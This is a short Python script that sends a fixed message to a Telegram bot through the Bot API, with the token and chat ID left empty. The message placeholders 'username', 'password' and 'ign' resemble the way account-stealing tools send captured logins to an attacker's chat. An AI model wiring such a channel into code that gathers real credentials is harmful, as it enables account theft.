import requests

TOKEN = ""
CHAT_ID = ""
MESSAGE = "username\npassword\nign"

url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
payload = {"chat_id": CHAT_ID, "text": MESSAGE}

response = requests.post(url, json=payload)

print(response.json())  # Check if it was sent successfully
